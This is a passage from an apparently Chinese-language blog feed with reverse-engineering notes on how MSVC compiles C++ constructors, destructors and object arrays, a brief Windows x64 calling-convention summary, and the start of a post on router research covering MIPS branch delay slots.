class="number">-44</span>h</span><br><span class="line">.text:<span class="number">0000000140003140</span> var_40= qword ptr <span class="number">-40</span>h</span><br><span class="line">.text:<span class="number">0000000140003140</span> var_38= qword ptr <span class="number">-38</span>h</span><br><span class="line">.text:<span class="number">0000000140003140</span> var_30= qword ptr <span class="number">-30</span>h</span><br><span class="line">.text:<span class="number">0000000140003140</span> var_28= qword ptr <span class="number">-28</span>h</span><br><span class="line">.text:<span class="number">0000000140003140</span> var_20= qword ptr <span class="number">-20</span>h</span><br><span class="line">.text:<span class="number">0000000140003140</span> var_18= qword ptr <span class="number">-18</span>h</span><br><span class="line">.text:<span class="number">0000000140003140</span> arg_0= qword ptr  <span class="number">8</span></span><br><span class="line">.text:<span class="number">0000000140003140</span> arg_8= qword ptr  <span class="number">10</span>h</span><br><span class="line">.text:<span class="number">0000000140003140</span></span><br><span class="line">.text:<span class="number">0000000140003140</span> mov     [rsp+arg_8], rdx</span><br><span class="line">.text:<span class="number">0000000140003145</span> mov     [rsp+arg_0], rcx                ; this</span><br><span class="line">.text:<span class="number">000000014000314</span>A sub     rsp, <span class="number">68</span>h</span><br><span class="line">.text:<span class="number">000000014000314</span>E mov     rax, [rsp+<span class="number">68</span>h+arg_0]            ; this</span><br><span class="line">.text:<span class="number">0000000140003153</span> mov     rcx, [rsp+<span class="number">68</span>h+arg_8]            ; obj</span><br><span class="line">.text:<span class="number">0000000140003158</span> mov     ecx, [rcx+<span class="number">8</span>]                    ; obj.age</span><br><span class="line">.text:<span class="number">000000014000315B</span> mov     [rax+<span class="number">8</span>], ecx                    ; this-&gt;age = obj.age;</span><br><span class="line">.text:<span class="number">000000014000315</span>E mov     rax, [rsp+<span class="number">68</span>h+arg_8]            ; obj</span><br><span class="line">.text:<span class="number">0000000140003163</span> mov     rax, [rax]                      ; rax=obj.name</span><br><span class="line">.text:<span class="number">0000000140003166</span> mov     [rsp+<span class="number">68</span>h+var_28], rax</span><br><span class="line">.text:<span class="number">000000014000316B</span> mov     [rsp+<span class="number">68</span>h+var_40], <span class="number">0F</span>FFFFFFFFFFFFFFFh</span><br><span class="line">.text:<span class="number">000000014000316B</span></span><br><span class="line">.text:<span class="number">0000000140003174</span></span><br><span class="line">.text:<span class="number">0000000140003174</span> loc_140003174:                          ; CODE XREF: Person::Person(Person <span class="type">const</span> &amp;)+<span class="number">47</span>â†“j</span><br><span class="line">.text:<span class="number">0000000140003174</span> inc     [rsp+<span class="number">68</span>h+var_40]                ; rsp+<span class="number">68</span>h+var_40æ˜¯å±€éƒ¨å˜é‡len</span><br><span class="line">.text:<span class="number">0000000140003179</span> mov     rax, [rsp+<span class="number">68</span>h+var_28]</span><br><span class="line">.text:<span class="number">000000014000317</span>E mov     rcx, [rsp+<span class="number">68</span>h+var_40]</span><br><span class="line">.text:<span class="number">0000000140003183</span> cmp     byte ptr [rax+rcx], <span class="number">0</span></span><br><span class="line">.text:<span class="number">0000000140003187</span> jnz     <span class="type">short</span> loc_140003174             ; rsp+<span class="number">68</span>h+var_40æ˜¯å±€éƒ¨å˜é‡len</span><br><span class="line">.text:<span class="number">0000000140003187</span></span><br><span class="line">.text:<span class="number">0000000140003189</span> mov     rax, [rsp+<span class="number">68</span>h+var_40]</span><br><span class="line">.text:<span class="number">000000014000318</span>E mov     [rsp+<span class="number">68</span>h+var_44], eax           ; <span class="type">int</span> len = <span class="built_in">strlen</span>(obj.name);</span><br><span class="line">.text:<span class="number">0000000140003192</span> movsxd  rax, [rsp+<span class="number">68</span>h+var_44]</span><br><span class="line">.text:<span class="number">0000000140003197</span> inc     rax</span><br><span class="line">.text:<span class="number">000000014000319</span>A mov     rcx, rax                        ; size</span><br><span class="line">.text:<span class="number">000000014000319</span>D call    j_??_U@YAPEAX_K@Z               ; operator new[](<span class="type">unsigned</span> __int64)</span><br><span class="line">.text:<span class="number">000000014000319</span>D</span><br><span class="line">.text:<span class="number">00000001400031</span>A2 mov     [rsp+<span class="number">68</span>h+var_20], rax</span><br><span class="line">.text:<span class="number">00000001400031</span>A7 mov     rax, [rsp+<span class="number">68</span>h+arg_0]</span><br><span class="line">.text:<span class="number">00000001400031</span>AC mov     rcx, [rsp+<span class="number">68</span>h+var_20]</span><br><span class="line">.text:<span class="number">00000001400031B</span>1 mov     [rax], rcx                      ;  this-&gt;name = new <span class="type">char</span>[len + <span class="keyword">sizeof</span>(<span class="type">char</span>)];</span><br><span class="line">.text:<span class="number">00000001400031B</span>4 mov     rax, [rsp+<span class="number">68</span>h+arg_8]</span><br><span class="line">.text:<span class="number">00000001400031B</span>9 mov     rax, [rax]</span><br><span class="line">.text:<span class="number">00000001400031B</span>C mov     [rsp+<span class="number">68</span>h+var_30], rax</span><br><span class="line">.text:<span class="number">00000001400031</span>C1 mov     rax, [rsp+<span class="number">68</span>h+arg_0]</span><br><span class="line">.text:<span class="number">00000001400031</span>C6 mov     rax, [rax]</span><br><span class="line">.text:<span class="number">00000001400031</span>C9 mov     [rsp+<span class="number">68</span>h+var_38], rax</span><br><span class="line">.text:<span class="number">00000001400031</span>CE mov     rax, [rsp+<span class="number">68</span>h+var_38]</span><br><span class="line">.text:<span class="number">00000001400031</span>D3 mov     [rsp+<span class="number">68</span>h+var_18], rax</span><br><span class="line">.text:<span class="number">00000001400031</span>D3</span><br><span class="line">.text:<span class="number">00000001400031</span>D8</span><br><span class="line">.text:<span class="number">00000001400031</span>D8 loc_1400031D8:                          ; CODE XREF: Person::Person(Person <span class="type">const</span> &amp;)+CFâ†“j</span><br><span class="line">.text:<span class="number">00000001400031</span>D8 mov     rax, [rsp+<span class="number">68</span>h+var_30]</span><br><span class="line">.text:<span class="number">00000001400031</span>DD movzx   eax, byte ptr [rax]</span><br><span class="line">.text:<span class="number">00000001400031E0</span> mov     [rsp+<span class="number">68</span>h+var_48], al</span><br><span class="line">.text:<span class="number">00000001400031E4</span> mov     rax, [rsp+<span class="number">68</span>h+var_38]</span><br><span class="line">.text:<span class="number">00000001400031E9</span> movzx   ecx, [rsp+<span class="number">68</span>h+var_48]</span><br><span class="line">.text:<span class="number">00000001400031</span>EE mov     [rax], cl</span><br><span class="line">.text:<span class="number">00000001400031F</span>0 mov     rax, [rsp+<span class="number">68</span>h+var_30]</span><br><span class="line">.text:<span class="number">00000001400031F</span>5 inc     rax</span><br><span class="line">.text:<span class="number">00000001400031F</span>8 mov     [rsp+<span class="number">68</span>h+var_30], rax</span><br><span class="line">.text:<span class="number">00000001400031F</span>D mov     rax, [rsp+<span class="number">68</span>h+var_38]</span><br><span class="line">.text:<span class="number">0000000140003202</span> inc     rax</span><br><span class="line">.text:<span class="number">0000000140003205</span> mov     [rsp+<span class="number">68</span>h+var_38], rax</span><br><span class="line">.text:<span class="number">000000014000320</span>A cmp     [rsp+<span class="number">68</span>h+var_48], <span class="number">0</span></span><br><span class="line">.text:<span class="number">000000014000320F</span> jnz     <span class="type">short</span> loc_1400031D8             ;  <span class="built_in">strcpy</span>(this-&gt;name, obj.name);</span><br><span class="line">.text:<span class="number">000000014000320F</span></span><br><span class="line">.text:<span class="number">0000000140003211</span> mov     rax, [rsp+<span class="number">68</span>h+arg_0]            ; è¿”å›æ–°å¯¹è±¡</span><br><span class="line">.text:<span class="number">0000000140003216</span> add     rsp, <span class="number">68</span>h</span><br><span class="line">.text:<span class="number">000000014000321</span>A retn</span><br></pre></td></tr></table></figure><h2 id="å¯¹è±¡ä½œä¸ºè¿”å›å€¼"><a href="#å¯¹è±¡ä½œä¸ºè¿”å›å€¼" class="headerlink" title="å¯¹è±¡ä½œä¸ºè¿”å›å€¼"></a>å¯¹è±¡ä½œä¸ºè¿”å›å€¼</h2><p>ä¸èƒ½ç”¨å¯„å­˜å™¨è¿”å›çš„é‡‡ç”¨åœ¨è°ƒç”¨è€…å‡½æ•°é‡Œå¼€è¾Ÿå±€éƒ¨ç©ºé—´ï¼Œé€šè¿‡æ‹·è´æ„é€ å‡½æ•°èµ‹å€¼ï¼ŒåŒæ ·ä¼šå­˜åœ¨ä½œä¸ºå‡½æ•°å‚æ•°æ—¶çš„ä¸€æ ·çš„é—®é¢˜</p><figure class="highlight c"><table><tr><td class="code"><pre><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;stdio.h&gt;</span></span></span><br><span class="line"></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">Person</span> &#123;</span></span><br><span class="line">public:</span><br><span class="line">  <span class="type">int</span> count;</span><br><span class="line">  <span class="type">int</span> buffer[<span class="number">10</span>]; <span class="comment">//å®šä¹‰ä¸¤ä¸ªæ•°æ®æˆå‘˜ï¼Œè¯¥ç±»çš„å¤§å°ä¸º 44 å­—èŠ‚</span></span><br><span class="line">&#125;;</span><br><span class="line"></span><br><span class="line">Person <span class="title function_">getPerson</span><span class="params">()</span> &#123;</span><br><span class="line">  Person person;</span><br><span class="line">  person.count = <span class="number">10</span>;</span><br><span class="line">  person.buffer[<span class="number">0</span>] = <span class="string">&#x27;g&#x27;</span>;</span><br><span class="line"></span><br><span class="line">  <span class="keyword">return</span> person;  <span class="comment">//è¿”å›å±€éƒ¨å¯¹è±¡</span></span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="type">int</span> <span class="title function_">main</span><span class="params">(<span class="type">int</span> argc, <span class="type">char</span>* argv[])</span> &#123;</span><br><span class="line">  Person person;</span><br><span class="line">  person = getPerson();</span><br><span class="line">  <span class="built_in">printf</span>(<span class="string">&quot;%d %d %d&quot;</span>, person.count, person.buffer[<span class="number">0</span>], person.buffer[<span class="number">9</span>]);</span><br><span class="line">  <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>æ±‡ç¼–å¤ªé•¿äº†ï¼Œä¸è´´äº†ï¼Œä¼ªä»£ç åŸºæœ¬å¯ä»¥æŠŠæ±‡ç¼–å®ç°ååº”å‡ºæ¥</p><p>mainé‡Œå¼€è¾Ÿå±€éƒ¨å˜é‡ï¼Œä½œä¸ºgetPersonå‚æ•°ï¼Œè¿”å›åå†å¤åˆ¶ç»™v4å†ç»™v3</p><p>æ²¡ææ‡‚ä¸ºä»€ä¹ˆä¸ç›´æ¥ç”¨resultï¼Œè¿˜è¦å†ç»™v4èµ‹å€¼ä¸€ä¸‹</p><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">__int64 __fastcall main(int argc, char **argv)</span><br><span class="line">&#123;</span><br><span class="line">  int v3[11]; // [rsp+20h] [rbp-A8h] BYREF</span><br><span class="line">  char v4[44]; // [rsp+50h] [rbp-78h] BYREF</span><br><span class="line">  Person result; // [rsp+80h] [rbp-48h] BYREF</span><br><span class="line"></span><br><span class="line">  qmemcpy(v4, getPerson(&amp;result), sizeof(v4));</span><br><span class="line">  qmemcpy(v3, v4, sizeof(v3));</span><br><span class="line">  j_printf(&quot;%d %d %d&quot;, (unsigned int)v3[0], (unsigned int)v3[1], (unsigned int)v3[10]);</span><br><span class="line">  return 0i64;</span><br><span class="line">&#125;</span><br><span class="line">Person *__fastcall getPerson(Person *result)</span><br><span class="line">&#123;</span><br><span class="line">  LODWORD(result-&gt;name) = 10;</span><br><span class="line">  HIDWORD(result-&gt;name) = &#x27;g&#x27;;</span><br><span class="line">  return result;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h2 id="æ„é€ å‡½æ•°è°ƒç”¨æ—¶æœº"><a href="#æ„é€ å‡½æ•°è°ƒç”¨æ—¶æœº" class="headerlink" title="æ„é€ å‡½æ•°è°ƒç”¨æ—¶æœº"></a>æ„é€ å‡½æ•°è°ƒç”¨æ—¶æœº</h2><h3 id="å±€éƒ¨å¯¹è±¡"><a href="#å±€éƒ¨å¯¹è±¡" class="headerlink" title="å±€éƒ¨å¯¹è±¡"></a>å±€éƒ¨å¯¹è±¡</h3><p>éšå¼ä¼ å…¥thisæŒ‡é’ˆï¼Œè¿”å›thisæŒ‡é’ˆ</p><figure class="highlight c"><table><tr><td class="code"><pre><span class="line">Person person;Â </span><br></pre></td></tr></table></figure><h3 id="å †å¯¹è±¡"><a href="#å †å¯¹è±¡" class="headerlink" title="å †å¯¹è±¡"></a>å †å¯¹è±¡</h3><figure class="highlight c"><table><tr><td class="code"><pre><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;stdio.h&gt;</span></span></span><br><span class="line"></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">Person</span> &#123;</span></span><br><span class="line">public:</span><br><span class="line">  Person() &#123;</span><br><span class="line">    age = <span class="number">20</span>;</span><br><span class="line">  &#125;</span><br><span class="line">  <span class="type">int</span> age;</span><br><span class="line">&#125;;</span><br><span class="line"></span><br><span class="line"><span class="type">int</span> <span class="title function_">main</span><span class="params">(<span class="type">int</span> argc, <span class="type">char</span>* argv[])</span> &#123;</span><br><span class="line">  Person* p = new Person;</span><br><span class="line">  p-&gt;age = <span class="number">21</span>;</span><br><span class="line">  <span class="built_in">printf</span>(<span class="string">&quot;%d\n&quot;</span>, p-&gt;age);</span><br><span class="line">  <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>newå®Œåä¼šåˆ¤æ–­æ˜¯å¦ç”³è¯·å¤±è´¥ï¼Œå†³å®šæ˜¯å¦è°ƒç”¨æ„é€ å‡½æ•°ï¼Œmallocä¸è´Ÿè´£è§¦å‘æ„é€ å‡½æ•°ï¼Œå®ƒä¹Ÿä¸æ˜¯è¿ç®—ç¬¦ï¼Œæ— æ³•è¿›è¡Œè¿ç®—ç¬¦é‡è½½ã€‚</p><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">.text:0000000140003010                               main proc near                          ; CODE XREF: main_0â†‘j</span><br><span class="line">.text:0000000140003010                                                                       ; DATA XREF: .pdata:000000014000B270â†“o</span><br><span class="line">.text:0000000140003010</span><br><span class="line">.text:0000000140003010                               var_28= qword ptr -28h</span><br><span class="line">.text:0000000140003010                               var_20= qword ptr -20h</span><br><span class="line">.text:0000000140003010                               var_18= qword ptr -18h</span><br><span class="line">.text:0000000140003010                               var_10= qword ptr -10h</span><br><span class="line">.text:0000000140003010                               arg_0= dword ptr  8</span><br><span class="line">.text:0000000140003010                               arg_8= qword ptr  10h</span><br><span class="line">.text:0000000140003010</span><br><span class="line">.text:0000000140003010                               ; FUNCTION CHUNK AT .text:0000000140005240 SIZE 0000001D BYTES</span><br><span class="line">.text:0000000140003010</span><br><span class="line">.text:0000000140003010                               ; __unwind &#123; // __CxxFrameHandler4_0</span><br><span class="line">.text:0000000140003010 48 89 54 24 10                mov     [rsp+arg_8], rdx</span><br><span class="line">.text:0000000140003015 89 4C 24 08                   mov     [rsp+arg_0], ecx</span><br><span class="line">.text:0000000140003019 48 83 EC 48                   sub     rsp, 48h</span><br><span class="line">.text:000000014000301D B9 04 00 00 00                mov     ecx, 4                          ; size</span><br><span class="line">.text:0000000140003022 E8 F2 DF FF FF                call    j_??2@YAPEAX_K@Z                ; operator new(unsigned __int64)</span><br><span class="line">.text:0000000140003022</span><br><span class="line">.text:0000000140003027 48 89 44 24 20                mov     [rsp+48h+var_28], rax</span><br><span class="line">.text:000000014000302C 48 83 7C 24 20 00             cmp     [rsp+48h+var_28], 0</span><br><span class="line">.text:0000000140003032 74 11                         jz      short loc_140003045             ;è·³è¿‡æ„é€ å‡½æ•°</span><br><span class="line">.text:0000000140003032</span><br><span class="line">.text:0000000140003034 48 8B 4C 24 20                mov     rcx, [rsp+48h+var_28]           ; this</span><br><span class="line">.text:0000000140003039 E8 3D E2 FF FF                call    j_??0Person@@QEAA@XZ            ; Person::Person(void)</span><br><span class="line">.text:0000000140003039</span><br><span class="line">.text:000000014000303E 48 89 44 24 28                mov     [rsp+48h+var_20], rax</span><br><span class="line">.text:0000000140003043 EB 09                         jmp     short loc_14000304E</span><br><span class="line">.text:0000000140003043</span><br><span class="line">.text:0000000140003045                               ; ---------------------------------------------------------------------------</span><br><span class="line">.text:0000000140003045</span><br><span class="line">.text:0000000140003045                               loc_140003045:                          ; CODE XREF: main+22â†‘j</span><br><span class="line">.text:0000000140003045 48 C7 44 24 28 00 00 00 00    mov     [rsp+48h+var_20], 0</span><br><span class="line">.text:0000000140003045</span><br><span class="line">.text:000000014000304E</span><br><span class="line">.text:000000014000304E                               loc_14000304E:                          ; CODE XREF: main+33â†‘j</span><br><span class="line">.text:000000014000304E 48 8B 44 24 28                mov     rax, [rsp+48h+var_20]</span><br></pre></td></tr></table></figure><h3 id="å‚æ•°å¯¹è±¡-amp-amp-è¿”å›å¯¹è±¡"><a href="#å‚æ•°å¯¹è±¡-amp-amp-è¿”å›å¯¹è±¡" class="headerlink" title="å‚æ•°å¯¹è±¡&amp;&amp;è¿”å›å¯¹è±¡"></a>å‚æ•°å¯¹è±¡&amp;&amp;è¿”å›å¯¹è±¡</h3><h3 id="å…¨å±€å¯¹è±¡-amp-amp-é™æ€å¯¹è±¡"><a href="#å…¨å±€å¯¹è±¡-amp-amp-é™æ€å¯¹è±¡" class="headerlink" title="å…¨å±€å¯¹è±¡&amp;&amp;é™æ€å¯¹è±¡"></a>å…¨å±€å¯¹è±¡&amp;&amp;é™æ€å¯¹è±¡</h3><h2 id="ææ„å‡½æ•°è°ƒç”¨æ—¶æœº"><a href="#ææ„å‡½æ•°è°ƒç”¨æ—¶æœº" class="headerlink" title="ææ„å‡½æ•°è°ƒç”¨æ—¶æœº"></a>ææ„å‡½æ•°è°ƒç”¨æ—¶æœº</h2><h3 id="å±€éƒ¨å¯¹è±¡-1"><a href="#å±€éƒ¨å¯¹è±¡-1" class="headerlink" title="å±€éƒ¨å¯¹è±¡"></a>å±€éƒ¨å¯¹è±¡</h3><p>ä¼ é€’thisæŒ‡é’ˆ</p><h3 id="å †å¯¹è±¡-1"><a href="#å †å¯¹è±¡-1" class="headerlink" title="å †å¯¹è±¡"></a>å †å¯¹è±¡</h3><figure class="highlight c"><table><tr><td class="code"><pre><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;stdio.h&gt;</span></span></span><br><span class="line"></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">Person</span> &#123;</span></span><br><span class="line">public:</span><br><span class="line">  Person() &#123;</span><br><span class="line">    age = <span class="number">20</span>;</span><br><span class="line">  &#125;</span><br><span class="line">  ~Person() &#123;</span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">&quot;~Person()\n&quot;</span>);</span><br><span class="line">  &#125;</span><br><span class="line">  <span class="type">int</span> age;</span><br><span class="line">&#125;;</span><br><span class="line"></span><br><span class="line"><span class="type">int</span> <span class="title function_">main</span><span class="params">(<span class="type">int</span> argc, <span class="type">char</span>* argv[])</span> &#123;</span><br><span class="line">  Person* person = new Person();</span><br><span class="line">  person-&gt;age = <span class="number">21</span>;              <span class="comment">//ä¸ºäº†ä¾¿äºè®²è§£ï¼Œè¿™é‡Œæ²¡æ£€æŸ¥æŒ‡é’ˆ</span></span><br><span class="line">  <span class="built_in">printf</span>(<span class="string">&quot;%d\n&quot;</span>, person-&gt;age);</span><br><span class="line">  delete person;</span><br><span class="line">  <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>è°ƒç”¨deleteæ—¶å¦‚æœåˆ¤æ–­ä¸º0ç›´æ¥è·³è¿‡ææ„å‡½æ•°ï¼Œè°ƒç”¨ä»£ç†ææ„å‡½æ•°æ—¶ï¼Œä¼ å…¥äº†ä¸¤å‚æ•° tishæŒ‡é’ˆå’Œ1</p><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">.text:00000001400016E5 mov     [rsp+58h+var_20], rax           ; å¯¹è±¡åœ°å€</span><br><span class="line">.text:00000001400016EA cmp     [rsp+58h+var_20], 0</span><br><span class="line">.text:00000001400016F0 jz      short loc_140001708</span><br><span class="line">.text:00000001400016F0</span><br><span class="line">.text:00000001400016F2 mov     edx, 1                          ; unsigned int </span><br><span class="line">.text:00000001400016F7 mov     rcx, [rsp+58h+var_20]           ; this</span><br><span class="line">.text:00000001400016FC call    j_??_GPerson@@QEAAPEAXI@Z       ; Person::`scalar deleting destructor&#x27;(uint)</span><br></pre></td></tr></table></figure><p>ç¬¬äºŒä¸ªå‚æ•°1è¡¨ç¤ºåº”è¯¥å¦‚ä½•ææ„ï¼Œä¾‹å¦‚ä¸‹é¢çš„æƒ…å†µ</p><figure class="highlight c"><table><tr><td class="code"><pre><span class="line"><span class="type">int</span> <span class="title function_">main</span><span class="params">(<span class="type">int</span> argc, <span class="type">char</span>* argv[])</span> &#123;</span><br><span class="line">  Person *objs = new Person[<span class="number">3</span>];  <span class="comment">//ç”³è¯·å¯¹è±¡æ•°ç»„</span></span><br><span class="line">  delete[] objs;                 <span class="comment">//é‡Šæ”¾å¯¹è±¡æ•°ç»„</span></span><br><span class="line">  <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>newç”³è¯·æ—¶ç”³è¯·äº†20å¤§å°ï¼Œæ¯”Person[3]å¤šäº†å †ç©ºé—´çš„é¦–åœ°å€å¤„çš„8å­—èŠ‚æ¥å†…å®¹ä¿å­˜å¯¹è±¡æ•°é‡</p><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">.text:000000014000169D mov     ecx, 14h                        ; size</span><br><span class="line">.text:00000001400016A2 call    j_??_U@YAPEAX_K@Z               ; operator new[](unsigned __int64)</span><br><span class="line">.text:00000001400016A2</span><br><span class="line">.text:00000001400016A7 mov     [rsp+68h+var_38], rax</span><br><span class="line">.text:00000001400016AC cmp     [rsp+68h+var_38], 0</span><br><span class="line">.text:00000001400016B2 jz      short loc_1400016FF</span><br><span class="line">.text:00000001400016B2</span><br><span class="line">.text:00000001400016B4 mov     rax, [rsp+68h+var_38]</span><br><span class="line">.text:00000001400016B9 mov     qword ptr [rax], 3             ;é¦–åœ°å€å¤„çš„8å­—èŠ‚ä¿å­˜å¯¹è±¡æ•°é‡</span><br></pre></td></tr></table></figure><p>è°ƒç”¨ä»£ç†æ„é€ å‡½æ•°(ç¬¬ä¸€ä¸ªå¯¹è±¡åœ°å€,å¯¹è±¡å¤§å°ï¼Œå¯¹è±¡ä¸ªæ•°ï¼Œæ„é€ å‡½æ•°åœ°å€),ä»£ç†æ„é€ å‡½æ•°å»ä¸€ä¸ªä¸€ä¸ªæ„é€ å¯¹è±¡</p><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">.text:00000001400016C0 mov     rax, [rsp+68h+var_38]</span><br><span class="line">.text:00000001400016C5 add     rax, 8</span><br><span class="line">.........</span><br><span class="line">.text:00000001400016D5 lea     r9, j_??0Person@@QEAA@XZ        ; constructor</span><br><span class="line">.text:00000001400016DC mov     r8d, 3                          ; count</span><br><span class="line">.text:00000001400016E2 mov     edx, 4                          ; size</span><br><span class="line">.text:00000001400016E7 mov     rcx, rax                        ; ptr</span><br><span class="line">.text:00000001400016EA call    j_??_L@YAXPEAX_K1P6AX0@Z2@Z     ; `eh vector constructor iterator&#x27;(void *,unsigned __int64,unsigned __int64,void (*)(void *),void (*)(vo</span><br></pre></td></tr></table></figure><p>è°ƒç”¨ä»£ç†ææ„å‡½æ•°(ç¬¬ä¸€ä¸ªå¯¹è±¡åœ°å€ï¼Œé‡Šæ”¾å¯¹è±¡ç±»å‹æ ‡å¿—:1ä¸ºé‡Šæ”¾å•ä¸ªå¯¹è±¡ï¼Œ3ä¸ºé‡Šæ”¾å¯¹è±¡æ•°ç»„ï¼Œ0è¡¨ç¤ºå•ä¸ªå¯¹è±¡ä»…ä»…æ‰§è¡Œææ„å‡½æ•°ï¼Œä¸é‡Šæ”¾å †ç©ºé—´ï¼Œ2è°ƒç”¨å¯¹è±¡æ•°ç»„ææ„å‡½æ•°ï¼Œä¸é‡Šæ”¾å †ç©ºé—´)</p><p>delete[]å‚æ•°äºŒä¸º3ï¼Œdeleteä¸º1</p><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">.text:000000014000172E mov     edx, 3                          ; unsigned int</span><br><span class="line">.text:0000000140001733 mov     rcx, [rsp+68h+var_28]           ; this</span><br><span class="line">.text:0000000140001738 call    j_??_EPerson@@QEAAPEAXI@Z       ; Person::`vector deleting destructor&#x27;(uint)</span><br></pre></td></tr></table></figure><h3 id="å‚æ•°å¯¹è±¡-amp-amp-è¿”å›å¯¹è±¡-1"><a href="#å‚æ•°å¯¹è±¡-amp-amp-è¿”å›å¯¹è±¡-1" class="headerlink" title="å‚æ•°å¯¹è±¡&amp;&amp;è¿”å›å¯¹è±¡"></a>å‚æ•°å¯¹è±¡&amp;&amp;è¿”å›å¯¹è±¡</h3><h3 id="å…¨å±€å¯¹-amp-amp-é™æ€å¯¹è±¡"><a href="#å…¨å±€å¯¹-amp-amp-é™æ€å¯¹è±¡" class="headerlink" title="å…¨å±€å¯¹&amp;&amp;é™æ€å¯¹è±¡"></a>å…¨å±€å¯¹&amp;&amp;é™æ€å¯¹è±¡</h3><h2 id="Reference"><a href="#Reference" class="headerlink" title="Reference"></a>Reference</h2><p><strong>C++åæ±‡ç¼–ä¸é€†å‘åˆ†ææŠ€æœ¯æ­ç§˜</strong></p>]]></content>
      
      
      
    </entry>
    
    
    
    <entry>
      <title>Windows x64 calling conventions</title>
      <link href="/2023/10/22/windows-x64-calling-conventions/"/>
      <url>/2023/10/22/windows-x64-calling-conventions/</url>
      
        <content type="html"><![CDATA[<p>å‰å››ä¸ªå‚æ•°rcxï¼Œrdx ï¼Œr8ï¼Œr9ï¼Œå…¶ä½™å‚æ•°ä»å³å¾€å·¦å…¥æ ˆï¼Œå°äºç­‰äº64ä½è¿”å›å€¼ç”±RAXä¼ é€’</p><p>æµ®ç‚¹ç±»å‹å‚æ•°ç”±XMM0,XMM1,XMM2,XMM3ä¾æ¬¡ä¼ é€’ï¼Œæµ®ç‚¹è¿”å›å€¼ç”±XMM0</p><p>éé¡µå‡½æ•°å¯„å­˜å™¨ä¼ å‚ä¹Ÿéœ€è¦åˆ†é…å‚æ•°æ ˆç©ºé—´ï¼Œè°ƒç”¨è€…æ¸…ç†å †æ ˆ</p><p>calä¹‹å‰å †æ ˆå¿…é¡»ä¿æŒ 16 å­—èŠ‚å¯¹é½</p><p>å°äº64ä½çš„å‚æ•°å¹¶ä¸è¿›è¡Œé«˜ä½é›¶æ‰©å±•ï¼Œä¹Ÿå°±æ˜¯é«˜ä½æ˜¯æ— æ³•é¢„æµ‹çš„åƒåœ¾æ•°æ®(x64å¯¹å¯„å­˜å™¨ä½32ä½èµ‹å€¼ä¼šæŠŠé«˜32ä½ç½®é›¶)ã€‚</p><p>emmï¼Œå†™ç€å†™ç€å‘ç°æ‰‹å†Œé‡Œè¯´çš„å¤ªæ¸…æ¥šäº†ï¼Œæ’¤äº†ï¼š<a href="https://learn.microsoft.com/zh-cn/cpp/build/x64-calling-convention?view=msvc-170">https://learn.microsoft.com/zh-cn/cpp/build/x64-calling-convention?view=msvc-170</a></p>]]></content>
      
      
      
    </entry>
    
    
    
    <entry>
      <title>åˆæ¢è·¯ç”±å™¨æŒ–æ˜</title>
      <link href="/2023/10/22/first-router/"/>
      <url>/2023/10/22/first-router/</url>
      
        <content type="html"><![CDATA[<p>æœ‰äº›ä¸œè¥¿æ­å»ºèµ·æ¥æ¯”è¾ƒéº»çƒ¦ï¼Œiotè™šæ‹Ÿæœºï¼š<a href="https://github.com/adi0x90/attifyos">https://github.com/adi0x90/attifyos</a></p><p>cgibinå’Œhttpdå…³ç³»:<a href="https://bbs.kanxue.com/thread-276464.htm">https://bbs.kanxue.com/thread-276464.htm</a></p><p>å¯¹äºä¸€äº›åˆ†æ”¯è·³è½¬æŒ‡ä»¤ï¼Œæµæ°´çº¿ä¼šåœé¡¿ä¸€ä¸ªå‘¨æœŸå·¦å³ï¼Œä¸ºäº†åˆ©ç”¨èµ·æ¥è¿™ä¸€ä¸ªå‘¨æœŸï¼Œæä¾›æµæ°´çº¿æ•ˆç‡ï¼Œåœ¨åˆ†æ”¯è·³è½¬æŒ‡ä»¤ååŠ å…¥ä¸ç®¡åˆ†æ”¯å‘ç”Ÿä¸å¦å…¶æ€»æ˜¯è¢«æ‰§è¡Œçš„æŒ‡ä»¤<a href="https://blog.csdn.net/weixin_46318370/article/details/108033218">1</a>,åŠ å…¥æŒ‡ä»¤çš„ä½ç½®ä¸€èˆ¬å«åˆ†æ”¯å»¶è¿Ÿæ§½<br>MIPSåˆ†æ”¯å»¶è¿Ÿæ§½ä¸­çš„æŒ‡ä»¤å…ˆäºåˆ†æ”¯æŒ‡ä»¤æäº¤ï¼Œåˆ†æ”¯è·³è½¬æŒ‡ä»¤æµï¼šåˆ†æ”¯è·³è½¬æŒ‡ä»¤ -&gt; å»¶æ—¶æ§½æŒ‡ä»¤ -&gt; ç›®æ ‡è·³è½¬åœ°å€çš„æŒ‡ä»¤</p><p>æ¯”å¦‚ä¸‹é¢jalråˆ°printfä¹‹å‰ä¼šå…ˆæ‰§è¡ŒæŒ‡ä»¤liä¼ å‚</p><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">.text:004099BC 09 F8 20 03                   jalr    $t9 ; printf</span><br><span class="line">.text:004099C0 88 A9 84 24                   li      $a0, aHttp11200OkCon_3    åˆ†æ”¯å»¶è¿Ÿæ§½</span><br></pre></td></tr></table></figure><p>åˆ†æ”¯å»¶è¿Ÿæ§½åœ¨ DSPå¤„ç†å™¨å’Œå†å²è¾ƒæ‚ ä¹…çš„ RISC ä¸Šæ¯”è¾ƒå¸¸è§ï¼Œå¦‚ MIPS,  SPARC 